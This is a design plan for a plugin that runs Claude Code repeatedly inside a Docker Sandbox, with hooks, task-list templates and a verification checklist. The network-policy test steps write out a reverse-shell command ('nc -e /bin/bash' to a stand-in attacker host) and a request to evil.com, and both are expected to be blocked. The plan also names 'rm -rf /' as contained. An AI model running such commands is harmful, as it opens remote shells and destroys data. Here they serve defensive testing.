# Ralph Loop Development Workflow — Implementation Plan

## Context

The Ralph Loop is an outer orchestration pattern that repeatedly invokes Claude Code CLI against file-based specifications. Each iteration gets a fresh context window, avoiding context rot. State persists on disk between iterations via progress files, PRD task lists, and memory files. A bash script drives the loop.

This plan builds a **standalone `ralph` plugin** under `claude-code/plugins/ralph/`, separate from the `zaksak` plugin. This keeps the ralph workflow self-contained and independently installable via the marketplace. The design draws from the synthesized research in `research/ralph-loops/`. Key differentiators from reference implementations: **Docker Sandbox microVM isolation** as the primary safety mechanism (with a PreToolUse hook blocklist as fallback), explicit separation of loop-scoped vs repo-scoped memory, context-aware wrap-up guidance, and self-managing task iteration.

### Prerequisites

- **Claude Code CLI** installed on host
- **Docker Desktop 4.58+** with Sandboxes enabled (recommended for primary safety mode)
- `jq` (for PRD verification in `ralph.sh`)
- macOS with Apple Silicon (primary target); Windows experimental, Linux legacy container mode
- If Docker is unavailable, the plugin falls back to a PreToolUse hook blocklist (see `pretooluse-hook-reference.md`)

---

## File Layout

New plugin at `claude-code/plugins/ralph/`:

```
claude-code/plugins/ralph/
├── .claude-plugin/
│   └── plugin.json                          # NEW: plugin manifest
├── hooks/
│   ├── hooks.json                           # NEW: plugin hook definitions
│   └── scripts/
│       ├── context_monitor.py              # NEW: PostToolUse context usage alerts
│       └── stop_loop_reminder.py            # NEW: Stop hook — PRD validation + enforce commit
├── sandbox/
│   ├── Dockerfile                           # NEW: custom sandbox template
│   └── entrypoint.sh                        # NEW: auth symlink + Claude launch
├── scripts/
│   ├── ralph.sh                             # NEW: main loop runner (sandbox-aware)
│   ├── ralph-init.sh                        # NEW: initialize a ralph loop in a project
│   └── ralph-archive.sh                     # NEW: archive a completed loop
└── templates/
    ├── prompt.md                            # NEW: per-iteration prompt template
    ├── prd-template.json                    # NEW: task list starter
    └── progress-template.md                 # NEW: progress log starter
```

Also update the root `marketplace.json` to register the new plugin.

When a user runs `ralph-init.sh` in their target project, it creates:

```
target-project/
├── ralph/
│   ├── prd.json          # Task list (copied from template, user fills in)
│   ├── progress.txt      # Append-only iteration log (loop-scoped memory)
│   └── prompt.md         # Iteration prompt (copied, customizable per-project)
└── .ralph-active          # Runtime marker (created by ralph.sh, gitignored)
```

---

## Components

### 1. Plugin Manifest

**File:** `claude-code/plugins/ralph/.claude-plugin/plugin.json`

```json
{
  "name": "ralph",
  "description": "Ralph Loop — autonomous agentic coding workflow with hooks-based safety, scoped memory, and self-managing task iteration",
  "version": "0.1.0",
  "hooks": "./hooks/hooks.json"
}
```

### 2. Marketplace Registration

**File:** `marketplace.json` (root) — add entry:

```json
{
  "name": "ralph",
  "source": "./claude-code/plugins/ralph",
  "description": "Ralph Loop — autonomous agentic coding workflow with hooks-based safety, scoped memory, and self-managing task iteration",
  "version": "0.1.0"
}
```

### 3. ralph.sh — Main Loop Runner

**File:** `claude-code/plugins/ralph/scripts/ralph.sh`

Core behavior:
- Iterates from 1 to `MAX_ITERATIONS` (default: 10), invoking Claude each time with the prompt template
- **Sandbox mode (default):** Uses `docker sandbox run -t dclaude:latest claude "$PROJECT_DIR" "$HOME/.dclaude_state" -- -p "$PROMPT"` — the sandbox provides OS-level isolation, `--dangerously-skip-permissions` is applied by the sandbox template automatically
- **Direct mode (fallback):** Uses `claude -p "$PROMPT" --dangerously-skip-permissions` — relies on PreToolUse hook blocklist for safety (see `pretooluse-hook-reference.md`)
- Auto-detects Docker Sandbox availability at startup; falls back to direct mode if unavailable
- Each iteration is a fresh `claude -p` process = fresh context window (the sandbox itself persists across iterations — fast reconnect, no re-setup)
- Uses `sed` to inject `$RALPH_ITERATION` and `$RALPH_MAX_ITERATIONS` into the prompt before passing to Claude
- Creates `.ralph-active` marker file on start (JSON with timestamp, pid, max_iterations, mode) — hooks check for this file to activate ralph-specific behavior
- Registers `trap` to clean up `.ralph-active` on EXIT/INT/TERM
- Detects completion via `<promise>COMPLETE</promise>` in output, then verifies with `jq` that all PRD stories have `passes: true`
- Falls back to PRD-only check (if agent completed everything but forgot the tag)
- Streams output to terminal via `tee /dev/stderr` while capturing for promise detection
- In sandbox mode, adds a 2-second sleep between iterations to allow file sync to settle
- Exits 0 on completion, 1 on max iterations reached

Arguments:
```
ralph.sh [OPTIONS]
  -n, --max-iterations N    Max loop iterations (default: 10)
  --ralph-dir PATH           Path to ralph/ directory (default: ./ralph)
  -d, --project-dir PATH    Project root (default: cwd)
  -m, --model MODEL         Claude model to use (e.g., opus, sonnet)
  --sandbox                  Force Docker Sandbox mode (error if unavailable)
  --no-sandbox               Force direct mode with PreToolUse hook blocklist
  -h, --help                Show usage
```

Dependencies: `jq` (for PRD verification), `claude` CLI. Docker Desktop 4.58+ recommended for sandbox mode.

### 4. Safety Isolation — Docker Sandbox

**Primary safety mechanism.** Instead of a PreToolUse hook that pattern-matches dangerous commands (bypassable via encoding, variable expansion, subshells), Ralph runs Claude inside a Docker Sandbox microVM that provides hypervisor-level isolation. Even `rm -rf /` only destroys the sandbox filesystem. Network exfiltration is blocked by the sandbox's built-in proxy with domain allowlisting.

See `docker-sandbox-isolation.md` for full setup, architecture diagram, network policy configuration, and known caveats.

**Sandbox template files:**

- **`sandbox/Dockerfile`** — Extends `docker/sandbox-templates:claude-code` with a custom entrypoint
- **`sandbox/entrypoint.sh`** — Symlinks shared auth state (`~/.dclaude_state`) into the sandbox user's home so credentials persist across sandboxes without mounting `~/.claude` directly

**Fallback:** When Docker Sandbox is unavailable (no Docker Desktop, Linux CI, etc.), `ralph.sh` runs Claude directly with `--dangerously-skip-permissions` and relies on a PreToolUse hook blocklist for safety. The hook script and full pattern reference are documented in `pretooluse-hook-reference.md`.

### 5. Hook Scripts

**File:** `claude-code/plugins/ralph/hooks/hooks.json`

Wires two hooks across two events (PostToolUse, Stop), plus a SessionStart cleanup. All hook scripts are written in Python for consistency, robust JSON handling (no `jq` dependency), and cleaner PRD validation logic. These hooks run inside the Docker Sandbox when sandbox mode is active.

#### 5a. Context Monitor (Always-on, graduated alerts)

**File:** `hooks/scripts/context_monitor.py`
**Event:** `PostToolUse`, matcher: `.*`
**Always active** — fires after every tool call

Estimates context usage by parsing the session transcript file (available via `transcript_path` in hook stdin JSON). Uses a `FILE_SIZE / 4` chars-per-token heuristic against a 200k token window (configurable via `CLAUDE_CONTEXT_WINDOW` env var).

Fires graduated alerts at 5 thresholds — each threshold triggers only once per session:

| Threshold | Severity | Message                                                                                        |
| --------- | -------- | ---------------------------------------------------------------------------------------------- |
| 50%, 60%  | NOTICE   | "Be mindful of remaining space. Plan to finish your current task within this session."         |
| 70%, 80%  | WARNING  | "Finish your current task and commit soon. Do not start additional tasks."                     |
| 90%       | CRITICAL | "Wrap up immediately — commit progress, update progress.txt, and stop. Do NOT start new work." |

**State tracking:** Uses `/tmp/claude-context-alerts-${SESSION_ID}` to record which thresholds have already fired. Each threshold fires once, then is suppressed for the rest of the session.

**Session cleanup:** A `SessionStart` hook (inline command in hooks.json) removes the state file at the start of each new session so thresholds re-arm.

**Output:** Returns JSON with `hookSpecificOutput.additionalContext` containing the alert message, which gets injected into Claude's context.

**Tuning:** If alerts fire too early, increase the chars-per-token divisor to 5–6. If too late, decrease to 3. After compaction the transcript file is not truncated, so estimates may run high post-compaction — this is conservative (alerts earlier, not later).

#### 5b. End-of-Loop Stop Reminder (Ralph-only)

**File:** `hooks/scripts/stop_loop_reminder.py`
**Event:** `Stop`
**Conditionally active:** only when `.ralph-active` exists

Runs two checks before allowing Claude to stop. Both must pass or the stop is blocked:

**Check 1: PRD schema validation** — Validates `ralph/prd.json` structure with `jq`:
- File exists and is valid JSON
- Required top-level fields: `project`, `branchName`, `description`, `userStories` (array)
- Every story has required fields: `id` (string), `title` (string), `passes` (boolean), `priority` (number), `acceptanceCriteria` (non-empty array)
- `id` values are unique (no duplicates)
- No story has `passes: true` with an empty `notes` field (enforce documentation of what was done)
- If validation fails → block with specific error describing which field/story is malformed

**Check 2: Uncommitted changes** — Checks `git status --porcelain`:
- If uncommitted changes exist → block, telling Claude to:
  1. Update `ralph/progress.txt` with what was accomplished + learnings
  2. Consider if any lasting patterns belong in CLAUDE.md or `.claude/rules/`
  3. Commit ALL changes including progress.txt and prd.json updates
- Claude must address the feedback and try stopping again

If both checks pass (valid PRD + no uncommitted changes), approves the stop.

### 6. Prompt Template

**File:** `claude-code/plugins/ralph/templates/prompt.md`

The prompt Claude receives each iteration. Structure:

1. **Header** — Identifies this as Ralph Loop iteration N of M
2. **Step 1: Orient** — Read progress.txt (especially Codebase Patterns section at top), read prd.json, check `git log` and `git status`
3. **Step 2: Select & Right-Size** — Pick highest-priority story where `passes: false` (respecting `dependsOn`). If too large for the context window (~60% of context is usable working space), break it into sub-stories in prd.json and work on the first one. Claude can also add new tasks, reorder priorities, or restructure the task list as needed.
4. **Step 3: Implement** — Read existing code first, follow patterns, implement one story, run project verification commands (from `prd.json.verifyCommands`)
5. **Step 4: Document Progress** — Append structured entry to progress.txt (what was done, files changed, verification results, learnings). Curate the Codebase Patterns section at the top with reusable discoveries
6. **Step 5: Consider Memory Updates** — Update CLAUDE.md or `.claude/rules/` ONLY for rules that persist beyond this ralph loop (e.g., "this project uses bun not npm"). Skip this step if nothing universal was learned
7. **Step 6: Commit & Signal** — Set `passes: true` in prd.json, commit with `feat: [US-xxx] - [Title]`, check if ALL stories complete → output `<promise>COMPLETE</promise>`

Hard rules embedded in the prompt:
- One story per iteration, never start a second
- Don't mark `passes: true` until verification passes
- Don't weaken tests to make them pass
- If stuck, document the blocker in progress.txt for the next iteration
- Claude may add/split/reorder stories in prd.json as needed (self-management)

### 7. PRD Template

**File:** `claude-code/plugins/ralph/templates/prd-template.json`

```json
{
  "project": "",
  "branchName": "ralph/feature-name",
  "description": "",
  "verifyCommands": [],
  "userStories": [
    {
      "id": "US-001",
      "title": "",
      "description": "",
      "acceptanceCriteria": [],
      "priority": 1,
      "passes": false,
      "notes": "",
      "dependsOn": []
    }
  ]
}
```

Key fields:
- `verifyCommands`: project-specific checks Claude runs each iteration (tests, lint, typecheck)
- `dependsOn`: ordering constraints between stories
- `passes`: boolean, toggled by Claude when acceptance criteria + verification pass
- `notes`: Claude appends implementation context for future iterations

### 8. Progress Template

**File:** `claude-code/plugins/ralph/templates/progress-template.md`

```markdown
# Ralph Progress Log
Started: {{DATE}}
PRD: {{PROJECT_NAME}}

## Codebase Patterns
- (Reusable patterns discovered during this loop)

---
```

Append-only after the `---`. The Codebase Patterns section at the top is curated (edited, not just appended) as the loop progresses.

### 9. Utility Scripts

#### ralph-init.sh

**File:** `claude-code/plugins/ralph/scripts/ralph-init.sh`

Usage: `ralph-init.sh [--project-dir PATH] [--name FEATURE_NAME]`

What it does:
1. Creates `ralph/` directory in the target project
2. Copies template files (prompt.md, prd-template.json → prd.json, progress-template.md → progress.txt)
3. Substitutes `{{DATE}}` and `{{PROJECT_NAME}}` in progress.txt
4. Sets `branchName` in prd.json to `ralph/<name>` if `--name` provided
5. Adds `.ralph-active` to `.gitignore` if not already there
6. Prints next-steps instructions

#### ralph-archive.sh

**File:** `claude-code/plugins/ralph/scripts/ralph-archive.sh`

Usage: `ralph-archive.sh [--project-dir PATH] [--label LABEL]`

What it does:
1. Creates `ralph-archive/<date>-<branch-or-label>/`
2. Moves prd.json and progress.txt to archive
3. Generates a `summary.md` (stories completed vs total, date range)
4. Resets `ralph/` to clean state with fresh templates
5. Commits the archive

---

## Implementation Order

1. **Plugin scaffold** — `.claude-plugin/plugin.json` + `marketplace.json` update
2. **Templates** — `prd-template.json`, `progress-template.md`, `prompt.md` (static files, no deps)
3. **Sandbox template** — `sandbox/Dockerfile` + `sandbox/entrypoint.sh` (see `docker-sandbox-isolation.md`)
4. **Hook scripts** — `context_monitor.py`, `stop_loop_reminder.py` (Python, standalone, testable independently)
5. **hooks.json** — Wire hooks to events (depends on hook scripts)
6. **ralph.sh** — Main loop runner with sandbox/direct mode detection (depends on templates + sandbox template)
7. **ralph-init.sh** — Initializer (depends on templates existing)
8. **ralph-archive.sh** — Archiver (depends on file layout)

---

## Design Decisions

| Decision                  | Choice                                  | Rationale                                                                                                                                                                |
| ------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Plugin structure          | Standalone `ralph` plugin               | Self-contained, independently installable, doesn't bloat `zaksak`                                                                                                        |
| Safety isolation          | Docker Sandbox microVM (primary)        | OS-level isolation is structurally stronger than regex pattern matching; not bypassable from inside; network proxy blocks exfiltration without maintaining pattern lists |
| Safety fallback           | PreToolUse hook blocklist               | For environments without Docker Desktop; pattern reference in `pretooluse-hook-reference.md`                                                                             |
| Task list mutability      | Claude can modify                       | Enables self-management: splitting, adding, reordering tasks                                                                                                             |
| Permission mode           | `--dangerously-skip-permissions`        | Fully autonomous; sandbox isolation (or hook blocklist) provides the safety net                                                                                          |
| Context reminders         | PostToolUse transcript-size monitor     | Graduated alerts at 50/60/70/80/90% via chars-per-token heuristic on transcript file                                                                                     |
| Progress.txt format       | Append-only with curated top section    | Loop-scoped memory; patterns section is edited, entries are append-only                                                                                                  |
| Memory file separation    | progress.txt (loop) vs CLAUDE.md (repo) | Clear boundary: task state vs lasting conventions                                                                                                                        |
| Completion detection      | Promise tag + PRD verification          | Dual check prevents false completion signals                                                                                                                             |
| Hook language             | All Python                              | Consistent codebase, built-in JSON handling (no `jq` dep), cleaner PRD validation                                                                                        |
| Prompt variable injection | `sed` substitution                      | No external dependency (vs `envsubst` requiring `gettext`)                                                                                                               |

---

## Verification Plan

1. **Sandbox template** — Build and run interactively:
   - `docker build -t dclaude:latest ./sandbox/` → should build without errors
   - `docker sandbox run -t dclaude:latest claude . -- -p "echo hello"` → should return output, confirm sandbox is functional
   - Verify auth persists: run twice, second run should not prompt for login
2. **Network policy** — Apply deny-by-default allowlist, verify:
   - `curl https://api.anthropic.com` → should succeed (allowed)
   - `curl https://evil.com` → should fail (blocked)
   - `nc -e /bin/bash attacker.com 4444` → should fail (non-HTTP blocked by default)
3. **Hook scripts** — Test each independently:
   - Create a fake transcript file, pass its path via JSON stdin to `context_monitor.py` → verify alerts fire at correct thresholds and each threshold fires only once
   - Create `.ralph-active` → run `stop_loop_reminder.py` with valid/invalid prd.json → verify schema validation blocks on malformed PRD, passes on valid
   - Create `.ralph-active` → run `stop_loop_reminder.py` with uncommitted changes → should return block decision
4. **ralph-init.sh** — Run in a temp directory, verify all files created correctly
5. **ralph.sh (sandbox mode)** — Run with `--sandbox --max-iterations 1` against a simple single-story PRD in a test project
6. **ralph.sh (direct mode)** — Run with `--no-sandbox --max-iterations 1` to verify fallback works
7. **ralph-archive.sh** — Run after a completed loop, verify archive structure and clean reset
8. **End-to-end** — Run a 2-3 story PRD through full ralph loop completion in sandbox mode

## Reference Documents

| File                           | Purpose                                                                                                                                                     |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `docker-sandbox-isolation.md`  | Full Docker Sandbox setup, architecture, network policies, caveats, `dclaude` wrapper                                                                       |
| `pretooluse-hook-reference.md` | PreToolUse hook implementation guide: 18 categories of dangerous command patterns, regex patterns, architecture, evasion awareness, false positive handling |
| `context-monitor-hook.md`      | Context monitor hook design notes                                                                                                                           |
